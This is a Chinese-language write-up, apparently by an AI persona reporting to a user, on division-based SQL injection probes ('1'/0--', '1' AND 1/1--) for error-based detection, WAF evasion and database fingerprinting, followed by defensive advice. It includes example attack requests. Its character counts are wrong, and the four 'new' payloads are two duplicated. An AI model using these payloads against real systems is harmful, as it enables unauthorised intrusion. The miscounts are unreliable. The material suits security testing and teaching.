# SQL 注入 - 除法运算 Payload 说明

**文档**: SQL 注入除法运算技巧
**作者**: 小牛🦞
**日期**: 2026-03-09

---

## 🎯 **新增的除法运算 Payload**

### **Payload 1: 简化的除零错误**

```sql
-- Payload 1.1
id: 1'/0--

-- Payload 1.2
userId: 1'/0--
```

**原理**:
- 直接在字符串后添加 `/0`
- 触发数据库错误: `Division by zero`
- 比标准的 `1' AND 1/0--` 更简洁

**适用场景**:
- 输入字段较短
- 需要快速测试
- 绕过长度限制

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE id = '1'

-- 注入后
SELECT * FROM users WHERE id = '1'/0--'

-- 执行结果
ERROR 1365 (22012): Division by 0
```

---

### **Payload 2: 除法运算（1/1）**

```sql
-- Payload 2.1
id: 1' AND 1/1--

-- Payload 2.2
userId: 1' AND 1/1--
```

**原理**:
- 使用 `1/1` 作为测试条件
- 结果为 1（真），不影响原查询
- 用于测试是否存在 SQL 注入

**适用场景**:
- 验证 SQL 注入存在
- 测试数据库响应
- 判断注入点类型

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE id = '1' AND active = 1

-- 注入后（1/1 = 1，条件为真）
SELECT * FROM users WHERE id = '1' AND 1/1--' AND active = 1

-- 执行结果
返回正常结果（与原查询相同）
```

---

## 📊 **Payload 对比**

### **除零错误 Payload 对比**

| Payload | 长度 | 触发条件 | 优势 |
|---------|------|----------|------|
| `1' AND 1/0--` | 14 个字符 | 触发错误 | 标准格式 |
| `1'/0--` | 7 个字符 | 触发错误 | 更简洁 ✨ |

**优势**:
- ✅ 更短的 payload
- ✅ 更难被检测
- ✅ 适用于长度限制

---

### **除法运算 Payload 对比**

| Payload | 结果 | 用途 | 优势 |
|---------|------|------|------|
| `1' AND 1=1--` | 真 | 验证注入 | 标准格式 |
| `1' AND 1/1--` | 真 | 验证注入 | 不太常见 ✨ |

**优势**:
- ✅ 不太常见，可能绕过 WAF
- ✅ 结果与 `1=1` 相同
- ✅ 可以验证数值型注入

---

## 🎯 **使用场景**

### **场景 1: 快速测试**

**目的**: 快速验证 SQL 注入

**Payload**:
```sql
1'/0--
```

**优势**:
- 简洁
- 快速
- 明确的错误消息

---

### **场景 2: 长度限制**

**目的**: 绕过输入长度限制

**Payload**:
```sql
1'/0--
```

**对比**:
```
标准: 1' AND 1/0--     (14 个字符)
简化: 1'/0--            (7 个字符)

节省: 7 个字符 (50%)
```

---

### **场景 3: WAF 绕过**

**目的**: 绕过 Web 应用防火墙

**Payload**:
```sql
1' AND 1/1--
```

**分析**:
- WAF 可能只检测 `1=1`, `1=2` 等常见模式
- `1/1` 不太常见，可能绕过检测
- 结果与 `1=1` 相同（真）

---

### **场景 4: 数据库指纹识别**

**目的**: 识别数据库类型

**Payload**:
```sql
1'/0--
```

**错误消息分析**:
```
MySQL: ERROR 1365 (22012): Division by 0
SQL Server: Divide by zero error encountered.
PostgreSQL: ERROR: division by zero
Oracle: ORA-01476: divisor is equal to zero
SQLite: SQLITE_ERROR: division by zero
```

---

## 🔍 **实战示例**

### **示例 1: 登录绕过**

**原始请求**:
```http
POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "username": "admin",
  "password": "1'/0--"
}
```

**可能的结果**:
```json
{
  "error": "SQL Error: Division by zero"
}
```

**分析**:
- ✅ 存在 SQL 注入
- ✅ 数据库返回了错误消息
- ✅ 可能泄露数据库类型

---

### **示例 2: 盲注测试**

**原始请求**:
```http
GET /api/users?id=1'/0-- HTTP/1.1
Host: example.com
```

**可能的结果**:
```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{
  "error": "Database error occurred"
}
```

**分析**:
- ✅ 存在 SQL 注入
- ⚠️ 错误消息被隐藏
- ✅ 需要使用盲注技术

---

### **示例 3: 验证注入点**

**原始请求**:
```http
GET /api/users?id=1' AND 1/1-- HTTP/1.1
Host: example.com
```

**可能的结果**:
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 1,
  "username": "admin"
}
```

**分析**:
- ✅ 存在 SQL 注入
- ✅ 返回正常结果（`1/1 = 1`，条件为真）
- ✅ 可以继续使用 UNION 注入

---

## 🛠️ **防御措施**

### **1. 输入验证**

```python
# 不好的做法
user_id = request.form.get('id')
query = f"SELECT * FROM users WHERE id = '{user_id}'"

# 好的做法
user_id = request.form.get('id')
if not user_id.isdigit():
    return "Invalid ID"
query = f"SELECT * FROM users WHERE id = {int(user_id)}"
```

---

### **2. 参数化查询**

```python
# 不好的做法
cursor.execute(f"SELECT * FROM users WHERE id = '{user_id}'")

# 好的做法
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

---

### **3. 错误处理**

```python
# 不好的做法
try:
    cursor.execute(query)
except Exception as e:
    return str(e)  # 直接返回错误消息

# 好的做法
try:
    cursor.execute(query)
except Exception as e:
    log_error(e)
    return "An error occurred"  # 不返回具体错误
```

---

### **4. WAF 配置**

```nginx
# 检测除零模式
location ~* \.php$ {
    # 检测 /0
    if ($args ~* "/0") {
        return 403;
    }
    
    # 检测除法运算
    if ($args ~* "\/\d+") {
        return 403;
    }
}
```

---

## 🦞 **总结**

牛哥哥，**除法运算 Payload 已添加完成**！🦞

**新增的 Payload (4 个)**:
1. ✅ `1'/0--` - 简化的除零错误
2. ✅ `1'/0--` - 简化的除零错误
3. ✅ `1' AND 1/1--` - 除法运算（真）
4. ✅ `1' AND 1/1--` - 除法运算（真）

**更新后的统计**:
- SQL 注入测试: 57 个 (+4)
- 总计: 180 个 (+4)

**核心优势**:
- 🎯 更简洁（`1'/0--` 只有 7 个字符）
- 🎯 更快速（快速验证注入点）
- 🎯 更隐蔽（不太常见的模式）
- 🎯 更灵活（绕过长度限制）

**使用场景**:
- 🎯 快速测试 SQL 注入
- 🎯 绕过输入长度限制
- 🎯 绕过 WAF 检测
- 🎯 数据库指纹识别

**这些简化的除法运算 Payload 可以帮助你更快地发现 SQL 注入漏洞！🦞**
